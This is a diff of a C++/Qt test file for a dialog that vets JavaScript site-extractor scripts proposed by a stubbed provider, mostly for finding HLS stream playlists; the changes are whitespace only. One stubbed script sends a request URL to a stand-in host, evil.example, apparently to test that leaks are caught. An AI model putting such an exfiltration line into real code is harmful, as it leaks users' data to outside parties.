@@ -266,11 +266,11 @@ int main(int argc, char **argv) {
 		extractor_store store;
 		stub_provider prov;
 		prov.reply = "extract = function (page, requests) {\n"
-		              "  for (var i = 0; i < requests.length; i++)\n"
-		              "    if (requests[i].url.indexOf('init-') !== -1)\n"
-		              "      return { url: requests[i].url, kind: 'direct' };\n"
-		              "  return null;\n"
-		              "};";
+			            "  for (var i = 0; i < requests.length; i++)\n"
+			            "    if (requests[i].url.indexOf('init-') !== -1)\n"
+			            "      return { url: requests[i].url, kind: 'direct' };\n"
+			            "  return null;\n"
+			            "};";
 		extractor_dialog dlg(&ev, &store, &prov, "site.example", cdn_page);
 		dlg.show();
 
@@ -283,26 +283,26 @@ int main(int argc, char **argv) {
 
 		QPlainTextEdit *payload = dlg.findChild<QPlainTextEdit *>("payload");
 		check(payload && payload->toPlainText().contains("HLS"),
-		      "the playlist was identified despite its .txt extension");
+			    "the playlist was identified despite its .txt extension");
 
 		send->click();
 		wait_for([&] { return judged(&dlg); });
 
 		QPushButton *apply = button(&dlg, "Use This");
 		check(apply && !apply->isEnabled(),
-		      "a proposal returning the init segment cannot be accepted");
+			    "a proposal returning the init segment cannot be accepted");
 		QLabel *verdict = dlg.findChild<QLabel *>("verdict");
 		check(verdict && verdict->text().contains("cf-master"),
-		      "and the reason points at the playlist instead");
+			    "and the reason points at the playlist instead");
 
 		// The same dialog, the same probes, the answer that is right: this must
 		// not have become a rule that refuses everything on a stream host.
 		prov.reply = "extract = function (page, requests) {\n"
-		              "  for (var i = 0; i < requests.length; i++)\n"
-		              "    if (requests[i].url.indexOf('cf-master') !== -1)\n"
-		              "      return { url: requests[i].url, kind: 'hls' };\n"
-		              "  return null;\n"
-		              "};";
+			            "  for (var i = 0; i < requests.length; i++)\n"
+			            "    if (requests[i].url.indexOf('cf-master') !== -1)\n"
+			            "      return { url: requests[i].url, kind: 'hls' };\n"
+			            "  return null;\n"
+			            "};";
 		send->click();
 		wait_for([&] { return apply && apply->isEnabled(); });
 		check(apply && apply->isEnabled(), "while the playlist itself is accepted");
@@ -318,7 +318,7 @@ int main(int argc, char **argv) {
 		               "return { url: r[i].url, kind: 'hls' }; return null; };",
 		               "");
 		const extractor_verdict v = site_extractor::check(
-			store.source_for("site.example"), page, sig.evidence_for("site.example"));
+		  store.source_for("site.example"), page, sig.evidence_for("site.example"));
 		check(v.usable, "it still matches this page");
 
 		// A site that changed shape: the same script, evidence without it.
@@ -329,7 +329,7 @@ int main(int argc, char **argv) {
 		c.kind = resource_kind::other;
 		other.on_request(c, request_decision{});
 		const extractor_verdict stale = site_extractor::check(
-			store.source_for("site.example"), page, other.evidence_for("site.example"));
+		  store.source_for("site.example"), page, other.evidence_for("site.example"));
 		check(!stale.usable,
 		      "and stops producing a result when the site changes, rather than "
 		      "producing a wrong one");
@@ -358,8 +358,8 @@ int main(int argc, char **argv) {
 			r.status = 200;
 			r.content_type = "application/vnd.apple.mpegurl";
 			r.body = u.toString().contains("cf-master")
-				? QByteArray("#EXTM3U\nindex-f1.txt?k=UCp\n")
-				: QByteArray("#EXTM3U\n#EXT-X-ENDLIST\n");
+			  ? QByteArray("#EXTM3U\nindex-f1.txt?k=UCp\n")
+			  : QByteArray("#EXTM3U\n#EXT-X-ENDLIST\n");
 			return r;
 		};
 
@@ -370,17 +370,17 @@ int main(int argc, char **argv) {
 		extractor_store store;
 		stub_provider prov;
 		prov.reply =
-			"extract = function (page, requests) {"
-			"  for (var i = 0; i < requests.length; i++) {"
-			"    var u = requests[i].url;"
-			"    if (u.indexOf('cf-master') === -1) continue;"
-			"    hydra.head(u);"
-			"    var body = hydra.text(u);"
-			"    hydra.log('found ' + body.length + ' bytes of playlist');"
-			"    return { url: u, kind: 'hls', headers: { Referer: page.url } };"
-			"  }"
-			"  return null;"
-			"};";
+		  "extract = function (page, requests) {"
+		  "  for (var i = 0; i < requests.length; i++) {"
+		  "    var u = requests[i].url;"
+		  "    if (u.indexOf('cf-master') === -1) continue;"
+		  "    hydra.head(u);"
+		  "    var body = hydra.text(u);"
+		  "    hydra.log('found ' + body.length + ' bytes of playlist');"
+		  "    return { url: u, kind: 'hls', headers: { Referer: page.url } };"
+		  "  }"
+		  "  return null;"
+		  "};";
 
 		const QUrl page("https://site.example/watch/1");
 		extractor_dialog dlg(&sig, &store, &prov, "site.example", page);
@@ -438,10 +438,10 @@ int main(int argc, char **argv) {
 		extractor_store store;
 		stub_provider prov;
 		prov.reply =
-			"extract = function (page, requests) {"
-			"  hydra.text(requests[0].url);"
-			"  return { url: requests[0].url, kind: 'hls' };"
-			"};";
+		  "extract = function (page, requests) {"
+		  "  hydra.text(requests[0].url);"
+		  "  return { url: requests[0].url, kind: 'hls' };"
+		  "};";
 
 		const QUrl page("https://site.example/watch/1");
 		extractor_dialog dlg(&sig, &store, &prov, "site.example", page);
@@ -494,10 +494,10 @@ int main(int argc, char **argv) {
 		extractor_store store;
 		stub_provider prov;
 		prov.reply =
-			"extract = function (page, requests) {"
-			"  hydra.text('https://evil.example/?d=' + requests[0].url);"
-			"  return { url: requests[0].url, kind: 'direct' };"
-			"};";
+		  "extract = function (page, requests) {"
+		  "  hydra.text('https://evil.example/?d=' + requests[0].url);"
+		  "  return { url: requests[0].url, kind: 'direct' };"
+		  "};";
 
 		const QUrl page("https://site.example/watch/1");
 		extractor_dialog dlg(&sig, &store, &prov, "site.example", page);
